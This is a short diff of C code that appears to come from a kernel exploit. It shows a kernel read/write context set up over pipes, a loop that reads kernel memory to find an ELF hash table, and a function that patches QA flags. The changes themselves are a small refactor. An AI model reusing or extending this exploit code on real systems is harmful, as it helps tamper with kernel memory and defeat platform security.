@@ -7,7 +7,7 @@
 kaddrs_t kaddrs = {0};
 karw_ctx_t karw_ctx = {0};
 
-void init_karw(payload_args_t *args) {
+void init_karw(kexp_args_t *args) {
   log("init karw started...");
 
   karw_ctx.master_pipe[0] = args->master_pipe[0];
@@ -67,18 +67,18 @@ found:
 }
 
 void find_hash_table() {
-  char data[0x10];
+  uint32_t elf_hash[4];
 
   log("find hash table started...");
 
   uintptr_t vaddr = ALIGN_DOWN(kaddrs.kdata, 0x1000);
   while (1) {
-    kread(data, vaddr, sizeof(data));
+    kread(elf_hash, vaddr, sizeof(elf_hash));
 
-    uint32_t elf_hash_nbucket = *(uint32_t *)(data + 0x00);
-    uint32_t elf_hash_nchain = *(uint32_t *)(data + 0x04);
-    uint32_t elf_hash_bucket = *(uint32_t *)(data + 0x08);
-    uint32_t elf_hash_chain = *(uint32_t *)(data + 0x0C);
+    uint32_t elf_hash_nbucket = elf_hash[0];
+    uint32_t elf_hash_nchain = elf_hash[1];
+    uint32_t elf_hash_bucket = elf_hash[2];
+    uint32_t elf_hash_chain = elf_hash[3];
 
     if (elf_hash_nbucket == 1 && elf_hash_nchain == 1 && elf_hash_bucket == 0 &&
         elf_hash_chain == 0) {
@@ -692,6 +692,5 @@ int patch_qa_flags() {
 
   log("patch qa flags completed !!");
 
-  notify("qa flags patches applied !!");
   return 0;
 }
